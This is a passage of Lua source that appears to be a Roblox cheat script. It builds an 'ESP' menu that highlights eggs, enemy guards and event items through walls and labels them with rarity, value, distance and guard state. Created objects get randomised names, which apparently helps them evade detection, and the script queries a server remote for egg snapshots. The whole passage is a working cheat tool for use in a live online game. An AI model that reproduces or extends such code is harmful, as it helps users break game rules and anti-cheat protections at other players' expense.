				local v16 = tbl23[arg]
				if v16 then
					return v16
				end
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag4 = type(directory) == "table" and directory[arg]
				local rarity = type(flag4) == "table" and type(flag4.Rarity) == "table" and flag4.Rarity or nil
				local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
				local v17 = tbl4.PaletteFromColor(color3)
				local rarityGradient = rarity and rarity.RarityGradient

				if rarity and typeof(rarityGradient) ~= "Instance" then
					rarityGradient = ReplicatedStorage:FindFirstChild("Assets")
					rarityGradient = rarityGradient and rarityGradient:FindFirstChild("UI")
					rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")

					if rarityGradient then
						rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
					end

					rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
				end

				if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
					v17.Text = rarityGradient.Color
					v17.Rotation = rarityGradient.Rotation
				end

				local name

				if rarity then
					name = tostring(rarity.DisplayName or rarity._id or "")
				else
					name = rarity
				end

				name = name or ""
				local rarityPalette

				if string.upper(name) == "SECRET" then
					rarityPalette = { Text = v7, Stroke = v17.Stroke, Outline = v17.Outline, Rotation = 90 }
				else
					rarityPalette = v17
				end

				local tbl24 = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				tbl24.Number = rarity or 0
				tbl24.Name = name
				tbl24.Color = color3
				tbl24.Palette = v17
				tbl24.RarityPalette = rarityPalette
				local displayName = type(flag4) == "table"

				if displayName then
					displayName = tostring(flag4.DisplayName or arg)
				end

				tbl24.DisplayName = displayName or tostring(arg)
				tbl24.Icon = type(flag4) == "table" and flag4.Icon or nil
				tbl24.EarningRate = type(flag4) == "table" and tonumber(flag4.EarningRate) or 0
				tbl23[arg] = tbl24
				return tbl24
			end

			local function fn19(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			local function fn20()
				if not v15 or not v15.Parent then
					v15 = tbl4.CreateRuntime()
				end
			end

			local function fn21(arg)
				local n23 = tonumber(arg) or 0
				local tbl24 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n24 = 1

				while math.abs(n23) >= 1000 and n24 < #tbl24 do
					n23 /= 1000
					n24 += 1
				end

				return string.format(n24 == 1 and "%.0f%s" or "%.2f%s", n23, tbl24[n24])
			end

			local function fn22(arg)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return tbl19.MaxDistance
				end
				return math.min(tbl19.MaxDistance, arg * currentCamera.ViewportSize.Y / 2 * n17 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function fn23(arg)
				local tbl24 = {
					{ arg.IconHolder, tbl8.Icon, arg.ShowIcon },
					{ arg.NameRow.Holder, tbl8.Name, arg.ShowName },
					{ arg.RarityRow.Holder, tbl8.Rarity, arg.ShowRarity },
					{ arg.MutationRow.Holder, tbl8.Mutation, arg.ShowMutation },
					{ arg.ValueRow.Holder, tbl8.Value, arg.ShowValue },
					{ arg.ExtraRow.Holder, tbl8.Info, arg.ShowExtra },
				}

				local n23 = 0

				for _, v16 in ipairs(tbl24) do
					if v16[3] then
						n23 += v16[2]
					end
				end

				local n24 = math.max(n23, 1)

				for _, v16 in ipairs(tbl24) do
					v16[1].Visible = v16[3]
					v16[1].Size = UDim2.fromScale(1, v16[3] and v16[2] / n24 or 0)
				end

				local v16 = tbl4.ScaledWidth(120, tbl19.SizeScale)
				local height = math.max(1, math.floor(tbl4.RowHeight(tbl19.SizeScale) * n24))

				if arg.Width ~= v16 or arg.Height ~= height or arg.Fixed ~= tbl19.FixedSize then
					arg.Width = v16
					arg.Height = height
					arg.Fixed = tbl19.FixedSize

					if tbl19.FixedSize then
						local n25 = n16 * tbl19.SizeScale
						arg.Billboard.Size = UDim2.fromScale(n25, n25 * height / v16)
						arg.Billboard.MaxDistance = fn22(n25)
					else
						arg.Billboard.Size = UDim2.fromOffset(v16, height)
						arg.Billboard.MaxDistance = tbl19.MaxDistance
					end
				end
			end

			local function fn24(arg)
				arg.Width = nil
				fn23(arg)
			end

			local function fn25()
				local v16, v17 = tbl4.CreateTag(v15, tbl19.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
				frame.Parent = v17
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local tbl24 = {
					Billboard = v16,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = tbl4.CreateTextRow(v17, tbl4.MainFont, 1, 0.4),
					RarityRow = tbl4.CreateTextRow(v17, v6, 2, 0.2),
					MutationRow = tbl4.CreateTextRow(v17, tbl4.MainFont, 3, 0.2),
					ValueRow = tbl4.CreateTextRow(v17, tbl4.MainFont, 4, 0.2),
					ExtraRow = tbl4.CreateTextRow(v17, tbl4.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				fn23(tbl24)
				return tbl24
			end

			local function fn26(arg)
				if arg.Highlight then
					arg.Highlight:Destroy()
					arg.Highlight = nil
					n22 -= 1
				end
			end

			local function fn27(arg, arg2)
				local n23 = tonumber(arg.AssetScale) or 1
				local n24 = n23 > 5 and (n23 / 5) ^ 1.2 * 19.637875755794113 or n23 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n25 = 1

				if flag4 then
					local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(result) == "number"
					local n26 = 1

					if ok then
						n25 = result
					else
						n25 = n26
					end
				end

				return arg2.EarningRate * n24 * n25
			end

			local function fn28()
				local tbl24 = {}
				local eggState = tbl.EggState
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl24
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl24
				end
				local str = tostring(localPlayer.UserId)
				local tbl25 = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) then
						tbl25[#tbl25 + 1] = child
					end
				end

				for k, v16 in pairs(result) do
					if type(v16) == "table" and v16.Placement ~= nil and type(v16.AssetCategory) == "string" then
						local base = tostring(k)
						local v17 = nil

						for _, v18 in ipairs(tbl25) do
							if v18.Name == base or string.find(v18.Name, base, 1, true) or v18:GetAttribute("Uid") == base then
								v17 = v18
								break
							end
						end

						if v17 then
							local ok2, result2 = pcall(function()
								return v17:IsA("Model") and v17:GetPivot() or v17.CFrame
							end)

							local mutations = type(v16.Mutations) == "table" and v16.Mutations or {}

							tbl24[#tbl24 + 1] = {
								Uid = "base:" .. base,
								AssetCategory = v16.AssetCategory,
								AssetScale = v16.AssetScale,
								Mutations = mutations,
								BaseMutation = v16.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and result2 or nil,
								Model = v17,
							}
						end
					end
				end

				return tbl24
			end

			local function fn29(arg, arg2)
				if arg.State == "Claimed" then
					return false
				end

				if tbl19.MinRarity > 0 and arg2.Number < tbl19.MinRarity then
					return false
				end
				local flag4 = tbl19.MinValue > 0

				if flag4 then
					local minValue = tbl19.MinValue
					flag4 = fn27(arg, arg2) < minValue
				end

				if flag4 then
					return false
				end
				return true
			end

			local function fn30(arg, arg2, arg3)
				local model, hitbox

				if typeof(arg2.Model) == "Instance" then
					model = arg2.Model
					hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					hitbox = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, hitbox = fn19(arg2.Uid)
				end

				local bottomCFrame = arg2.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = hitbox or workspace.Terrain

					if arg.Anchor ~= terrain or arg.CFrame ~= bottomCFrame then
						arg.Anchor = terrain
						arg.CFrame = bottomCFrame
						arg.Billboard.Adornee = terrain
						arg.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (hitbox and hitbox.Position.Y - bottomCFrame.Position.Y or 1) + n15, 0)
					end
				end

				local info = tbl19.Info
				local baseMutation = arg2.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local n23 = tonumber(arg2.AssetScale) or 1
				local showIcon = info.Icon == true and arg3.Icon ~= nil

				if showIcon and arg.Icon.Image ~= tostring(arg3.Icon) then
					arg.Icon.Image = tostring(arg3.Icon)
				end

				local showName = info.Name == true

				if showName then
					tbl4.SetRow(arg.NameRow, arg3.DisplayName, tbl9)
				end

				local showRarity = info.Rarity == true and arg3.Name ~= ""

				if showRarity then
					local rarityPalette = arg3.RarityPalette
					tbl4.SetRow(arg.RarityRow, string.upper(arg3.Name), rarityPalette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					tbl4.SetRow(arg.MutationRow, string.upper(fn6(baseMutation)), tbl18[baseMutation] or v13)
				end

				local showValue = info.Value == true

				if showValue then
					tbl4.SetRow(arg.ValueRow, "$" .. fn21(fn27(arg2, arg3)) .. "/s", v8)
				end

				local tbl24 = {}
				local eggRecords = tbl.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg2.AssetCategory, n23)

					if ok and tonumber(result) then
						table.insert(tbl24, fn21(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(tbl24, string.format("x%.2f", n23))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, arg2)

					if ok and tonumber(result) then
						table.insert(tbl24, "$" .. fn21(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						table.insert(tbl24, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and arg2.AreaId ~= nil then
					table.insert(tbl24, tostring(arg2.AreaId))
				end

				if info.State and arg2.State ~= nil and arg2.State ~= "Slot" then
					table.insert(tbl24, tostring(arg2.State))
				end

				local showExtra = #tbl24 > 0

				if showExtra then
					tbl4.SetRow(arg.ExtraRow, table.concat(tbl24, "  |  "), tbl4.Palettes.Sheen)
				end

				if arg.ShowIcon ~= showIcon or arg.ShowName ~= showName or arg.ShowRarity ~= showRarity or arg.ShowMutation ~= showMutation or arg.ShowValue ~= showValue or arg.ShowExtra ~= showExtra then
					arg.ShowIcon = showIcon
					arg.ShowName = showName
					arg.ShowRarity = showRarity
					arg.ShowMutation = showMutation
					arg.ShowValue = showValue
					arg.ShowExtra = showExtra
					fn23(arg)
				end

				if (tbl19.Highlight == tbl7[3] or tbl19.Highlight == tbl7[2] and arg3.Number >= tbl19.HighlightMin) and model then
					if not arg.Highlight and n22 < n3 then
						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = arg3.Color
						highlight.OutlineColor = arg3.Palette.Outline
						highlight.Parent = v15
						arg.Highlight = highlight
						n22 += 1
					end

					if arg.Highlight and arg.Highlight.Adornee ~= model then
						arg.Highlight.Adornee = model
					end
				else
					fn26(arg)
				end
			end

			local function fn31(arg)
				fn26(arg)
				arg.Billboard:Destroy()
			end

			local function fn32()
				local v16 = tbl20
				local v17 = v15
				tbl20 = {}
				v15 = nil
				n22 = 0

				task.spawn(function()
					local now = os.clock()

					for _, v18 in pairs(v16) do
						if v18.Highlight then
							v18.Highlight:Destroy()
						end

						v18.Billboard:Destroy()

						if n18 < os.clock() - now then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if v17 then
						v17:Destroy()
					end
				end)
			end

			local function fn33(arg, arg2, arg3)
				local function fn34()
					return arg2 == n21 and arg3 == n20 and flag2
				end

				fn20()
				local tbl24 = {}
				local now = os.clock()

				for _, v16 in pairs(arg) do
					local uid = type(v16) == "table" and v16.Uid

					if type(uid) == "string" and type(v16.AssetCategory) == "string" then
						local v17 = fn18(v16.AssetCategory)

						if tbl19.Eggs and fn29(v16, v17) then
							tbl24[uid] = true
							local v18 = tbl20[uid]

							if not v18 then
								v18 = fn25()
								tbl20[uid] = v18
							end

							fn30(v18, v16, v17)
						end
					end

					if not (n18 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if not fn34() then
						return
					end
				end

				if tbl19.Eggs and tbl19.OwnBase then
					for _, v16 in ipairs(fn28()) do
						local v17 = fn18(v16.AssetCategory)

						if fn29(v16, v17) then
							tbl24[v16.Uid] = true
							local v18 = tbl20[v16.Uid]

							if not v18 then
								local v19 = fn25()
								tbl20[v16.Uid] = v19
								v18 = v19
							end

							fn30(v18, v16, v17)
						end
					end
				end

				for k, v16 in pairs(tbl20) do
					if not tbl24[k] then
						tbl20[k] = nil
						fn31(v16)
					end
				end

				return true
			end

			local flag4 = false
			local flag5 = false

			fn15 = function()
				if not flag2 or not v14 then
					return
				end
				flag4 = true
				if flag5 then
					return
				end
				flag5 = true

				task.defer(function()
					while flag2 and v14 and flag4 do
						flag4 = false
						n21 += 1
						local ok, result = pcall(fn33, v14, n21, n20)

						if ok and result ~= true then
							flag4 = true
						end

						RunService.Heartbeat:Wait()
					end

					flag5 = false
				end)
			end

			local function fn34()
				local v16 = n20

				if v14 and next(tbl20) == nil then
					fn15()
				end

				local eggState = tbl.EggState
				local flag6 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
				local records = nil

				if flag6 then
					local ok, result = pcall(eggState.ReadFieldEggs)
					ok = ok and type(result) == "table" and type(result.Records) == "table"
					records = nil

					if ok then
						records = result.Records
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n19 then
					n19 = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if v16 ~= n20 or not flag2 then
					return
				end

				if records ~= nil then
					local tbl24 = {}

					for k, record in pairs(records) do
						tbl24[k] = record
					end

					v14 = tbl24
				end

				if v14 then
					fn15()
				end
			end

			local function fn35()
				task.spawn(pcall, fn34)
			end

			local function fn36()
				if flag3 then
					return
				end
				flag3 = true

				task.delay(0.5, function()
					flag3 = false

					if flag2 then
						fn35()
					end
				end)
			end

			fn16 = function()
				for _, v16 in pairs(tbl20) do
					fn24(v16)
				end
			end

			local function fn37()
				flag2 = false
				n20 += 1
				n21 += 1
				tbl4.DisconnectAll(tbl21)
				fn32()
			end

			local function fn38()
				if flag2 then
					fn35()
					return
				end
				flag2 = true
				local v16 = n20
				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v17 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local v18 = eggState[v17]

						if type(v18) == "table" and type(v18.Connect) == "function" then
							local ok, result = pcall(v18.Connect, v18, fn36)

							if ok and result then
								table.insert(tbl21, result)
							end
						end
					end
				end

				for _, v17 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local v18 = workspace:FindFirstChild(v17)

					if v18 then
						table.insert(tbl21, v18.ChildAdded:Connect(fn36))
						table.insert(tbl21, v18.ChildRemoved:Connect(fn36))
					end
				end

				task.spawn(function()
					while v16 == n20 do
						task.wait(10)
						if v16 == n20 then
							fn36()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while v16 == n20 do
						task.wait(1)

						if v16 == n20 then
							if tbl19.Info.Distance then
								fn15()
							end

							continue
						end

						break
					end
				end)

				fn35()
			end

			local function fn39()
				if tbl19.Eggs then
					fn38()
				else
					fn37()
				end
			end

			tbl22 = { Eggs = nil }
			local tbl24 = { Eggs = false }
			local flag6 = false

			local function fn40()
				if flag6 then
					return
				end
				local v16 = tbl4.ReadToggle(tbl22.Eggs, tbl24.Eggs)
				if v16 == tbl19.Eggs and flag2 == v16 then
					return
				end
				tbl19.Eggs = v16
				fn39()
			end

			fn4(function()
				flag6 = true
				tbl19.Eggs = false
				fn37()
			end)

			fn17 = function(arg)
				local tbl25 = {}

				if type(arg) == "table" then
					for k, v16 in pairs(arg) do
						k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16 or nil

						if k then
							tbl25[k] = true
						end
					end
				end

				return tbl25
			end

			tbl22.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(arg)
					tbl24.Eggs = arg == true
					tbl4.SyncSoon(fn40)
				end,
			})
		end

		espSection:CreateToggle({
			Name = "ESP Fixed Size",
			Default = false,
			SubOf = tbl22.Eggs,
			Callback = function(arg)
				local fixedSize = arg == true

				if tbl19.FixedSize ~= fixedSize then
					tbl19.FixedSize = fixedSize
					fn16()
				end
			end,
		})

		espSection:CreateToggle({
			Name = "ESP Own Base Eggs",
			Note = "Also show the eggs placed in your own base",
			Default = true,
			SubOf = tbl22.Eggs,
			Callback = function(arg)
				tbl19.OwnBase = arg ~= false
				fn15()
			end,
		})

		do
			local tbl23 = { "Any" }
			local tbl24 = { Any = 0 }
			local tbl25 = {}
			local tbl26 = {}
			local tbl27 = { "Any Mutation", "No Mutation" }
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl28 = {}
			local tbl29 = {}

			if type(directory) == "table" then
				for k, v16 in pairs(directory) do
					local rarity = type(v16) == "table" and v16.Rarity or nil
					local flag4 = type(rarity) == "table"

					if flag4 then
						flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag4 = flag4 or nil

					if flag4 then
						local str = tostring(rarity.DisplayName or rarity._id or flag4)
						tbl28[flag4] = tbl28[flag4] or str

						table.insert(tbl29, {
							Category = tostring(k),
							Name = tostring(v16.DisplayName or k),
							Rarity = flag4,
							RarityName = str,
						})
					end
				end
			end

			local tbl30 = {}

			for k in pairs(tbl28) do
				table.insert(tbl30, k)
			end

			table.sort(tbl30)

			for _, v16 in ipairs(tbl30) do
				local str = string.format("%d - %s", v16, tbl28[v16])
				table.insert(tbl23, str)
				tbl24[str] = v16
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v16 in ipairs(tbl29) do
				local str = string.format("%s [%s]", v16.Name, v16.RarityName)

				if tbl26[str] then
					str = string.format("%s [%s] (%s)", v16.Name, v16.RarityName, v16.Category)
				end

				table.insert(tbl25, str)
				tbl26[str] = v16.Category
			end

			local tbl31 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl31, tostring(k))
				end
			end

			table.sort(tbl31)

			for _, v16 in ipairs(tbl31) do
				table.insert(tbl27, v16)
			end

			local function fn18(arg)
				for _, v16 in ipairs(tbl23) do
					if tbl24[v16] == arg then
						return v16
					end
				end

				return tbl23[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = tbl23,
				Default = fn18(5),
				SubOf = tbl22.Eggs,
				Callback = function(arg)
					tbl19.MinRarity = tbl24[type(arg) == "table" and arg[1] or arg] or 0
					fn15()
				end,
			})
		end

		fn5(espSection:CreateMultiDropdown({
			Name = "ESP Show Info",
			Options = tbl5,
			Default = tbl6,
			SubOf = tbl22.Eggs,
			Callback = function(arg)
				tbl19.Info = fn17(arg)
				fn15()
			end,
		}))

		do
			local tbl23 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local v16 = nil
			local n22 = 0
			local str = "M/s"

			local function fn18(arg, arg2)
				if arg ~= nil then
					n22 = math.max(0, math.floor(tonumber(arg) or n22))
				end

				if arg2 ~= nil then
					str = tostring(arg2)
				end

				tbl19.MinValue = n22 * (tbl23[str] or tbl23["M/s"]).Mult
				fn15()
			end

			v16 = espSection:CreateSlider({
				Name = "ESP Min Value",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						local ms = tbl23[arg] or tbl23["M/s"]

						if v16 and v16.SetRange then
							v16:SetRange(ms.Min, ms.Max)
							local min = tonumber(v16:Get()) or ms.Min
							local min2 = ms.Min
							local max = ms.Max
							local n23 = math.clamp(math.floor(min + 0.5), min2, max)

							if n23 ~= min then
								str = tostring(arg)
								v16:Set(n23)
								return
							end

							fn18(n23, arg)
						else
							fn18(nil, arg)
						end
					end,
				},
				SubOf = tbl22.Eggs,
				Callback = function(arg)
					fn18(arg, nil)
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = tbl22.Eggs,
			Callback = function(arg)
				local num = tonumber(arg)

				if num and tbl19.SizeScale ~= num / 100 then
					tbl19.SizeScale = num / 100
					fn16()
				end
			end,
		})

		do
			local n22 = 1
			local n23 = 0.75

			local tbl23 = {
				Sleeping = tbl4.Palettes.Accent,
				Waking = tbl4.Palettes.Gold,
				Chasing = tbl4.Palettes.Red,
			}

			local orange = tbl4.Palettes.Orange
			local tbl24 = {}
			local tbl25 = {}
			local flag4 = false
			local v16 = nil

			local function fn18(arg)
				local attribute = arg:GetAttribute("GuardState")
				if attribute == "Sleeping" then
					return "Sleeping"
				end

				if attribute == "Waking" then
					return "Waking Up"
				end

				if attribute == "Chasing" then
					local attribute2 = arg:GetAttribute("TargetPlayer")
					if attribute2 == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
					return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
				end

				return attribute and tostring(attribute) or "Awake"
			end

			local function fn19(arg, arg2)
				local v17 = tbl23[arg2:GetAttribute("GuardState")] or orange
				arg.Highlight.FillColor = v17.Outline
				arg.Highlight.OutlineColor = v17.Outline
				tbl4.SetRow(arg.StateRow, fn18(arg2), v17)
			end

			local function fn20(arg)
				local floor = math.floor
				arg.Tag.Size = UDim2.fromOffset(tbl4.ScaledWidth(115, n23), floor(tbl4.RowHeight(n23) * 1.6))
			end

			local function fn21(arg)
				local v17 = tbl24[arg]
				if not v17 then
					return
				end
				tbl24[arg] = nil
				tbl4.DisconnectAll(v17.Connections)
				v17.Highlight:Destroy()
				v17.Tag:Destroy()
			end

			local function fn22(arg, adornee)
				if tbl24[adornee] then
					return
				end
				local v17 = tbl4.FindGuardRoot(adornee)
				if not v17 then
					return
				end

				if not v16 or not v16.Parent then
					v16 = tbl4.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = v16
				local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
				ok = ok and typeof(result) == "CFrame"
				local n24 = 6

				if ok then
					n24 = result.Position.Y + result2.Y * 0.5 - v17.Position.Y + n22
				end

				local v18, v19 = tbl4.CreateTag(v16, math.huge)
				v18.Adornee = v17
				v18.StudsOffsetWorldSpace = Vector3.new(0, n24, 0)
				local v20 = tbl4.CreateTextRow(v19, tbl4.StatusFont, 1, 0.45)
				local v21 = tbl4.CreateTextRow(v19, tbl4.StatusFont, 2, 0.55)
				local sheen = tbl4.Palettes.Sheen
				tbl4.SetRow(v20, tostring(arg) .. " Guard", sheen)
				local tbl26 = { Highlight = highlight, Tag = v18, StateRow = v21, Connections = {} }
				tbl24[adornee] = tbl26
				fn20(tbl26)
				fn19(tbl26, adornee)

				local function fn23()
					fn19(tbl26, adornee)
				end

				table.insert(tbl26.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(fn23))
				table.insert(tbl26.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(fn23))

				table.insert(tbl26.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						fn21(adornee)
					end
				end))
			end

			local function fn23()
				flag4 = false
				tbl4.DisconnectAll(tbl25)

				for k in pairs(tbl24) do
					fn21(k)
				end

				if v16 then
					v16:Destroy()
					v16 = nil
				end
			end

			local function fn24()
				if flag4 then
					return
				end
				flag4 = true
				tbl25 = tbl4.WatchGuards(fn22)
			end

			local v17 = nil
			local flag5 = false
			local flag6 = false

			local function fn25()
				if flag6 then
					return
				end

				if tbl4.ReadToggle(v17, flag5) then
					fn24()
				elseif flag4 then
					fn23()
				end
			end

			fn4(function()
				flag6 = true
				fn23()
			end)

			v17 = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl4.SyncSoon(fn25)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v17,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n23 ~= num / 100 then
						n23 = num / 100

						for _, v18 in pairs(tbl24) do
							fn20(v18)
						end
					end
				end,
			})
		end

		do
			local tbl23 = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local v16 = tbl4.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accent = tbl4.Palettes.Accent
			local v17 = nil
			local tbl24 = {}
			local flag4 = false
			local connection = nil
			local v18 = nil
			local flag5 = false
			local flag6 = false

			local function fn18(arg)
				local v19 = tbl24[arg]
				if not v19 then
					return
				end
				tbl24[arg] = nil

				pcall(function()
					v19.Highlight:Destroy()
					v19.Tag:Destroy()
				end)
			end

			local function fn19()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, v19 in ipairs(tbl23) do
					local v20 = drScrambleEvent and drScrambleEvent:FindFirstChild(v19.Id)
					local hitbox

					if v20 then
						hitbox = v20:FindFirstChild("Hitbox", true) or v20.PrimaryPart or v20:FindFirstChildWhichIsA("BasePart", true)
					else
						hitbox = v20
					end

					local tbl25 = tbl24[v19.Id]

					if tbl25 and (tbl25.Model ~= v20 or not hitbox) then
						fn18(v19.Id)
						tbl25 = nil
					end

					if hitbox and not tbl25 then
						if not v17 or not v17.Parent then
							v17 = tbl4.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = v20
						highlight.Parent = v17
						local v21, v22 = tbl4.CreateTag(v17, 25000)
						v21.Adornee = hitbox
						v21.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						v21.Size = UDim2.fromOffset(tbl4.ScaledWidth(160), floor(tbl4.RowHeight() * 1.6))
						local v23 = tbl4.CreateTextRow(v22, tbl4.StatusFont, 1, 0.5)
						local v24 = tbl4.CreateTextRow(v22, tbl4.StatusFont, 2, 0.5)
						tbl4.SetRow(v23, v19.Label, tbl4.Palettes.Sheen)
						tbl25 = { Model = v20, Hitbox = hitbox, Highlight = highlight, Tag = v21, InfoRow = v24 }
						tbl24[v19.Id] = tbl25
					end

					if tbl25 then
						local flag7 = type(tbl3.ScrambleLostPart) == "function" and tbl3.ScrambleLostPart(v19.Id) == true
						local v21 = flag7 and accent or v16
						tbl4.SetRow(tbl25.InfoRow, flag7 and "Collected" or string.format("%d studs", math.floor(tbl3.DistanceTo(tbl25.Hitbox.Position))), v21)
						tbl25.Highlight.FillColor = v21.Outline
						tbl25.Highlight.OutlineColor = v21.Outline
					end
				end
			end

			local function fn20()
				flag4 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				for k in pairs(tbl24) do
